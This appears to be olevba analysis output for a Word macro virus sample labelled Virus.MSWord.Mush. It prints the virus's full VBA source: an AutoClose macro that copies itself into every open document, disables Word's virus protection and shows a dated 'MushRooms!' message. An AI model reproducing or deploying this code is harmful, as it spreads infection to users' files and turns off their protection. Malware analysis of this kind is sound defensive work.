olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mush
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mush - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MushRoom.bas 
in file: ./Virus.MSWord.Mush - OLE stream: 'Macros/VBA/MushRoom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro creata il 16/05/99 da Hacker's god"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.autoclose"
On Error Resume Next
Dim S, D, i
S = ActiveDocument.FullName
For i = 1 To Documents.Count
D = Documents(i).FullName
Application.OrganizerCopy Source:=S, Destination:=D, Name:="MushRoom", Object:=wdOrganizerObjectProjectItems
Next i
Options.VirusProtection = False
If Month(Now) = 10 And Hour(Now) < 7 Then MsgBox "MushRooms!"
'Mushrooms are tasty, aren't they?
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

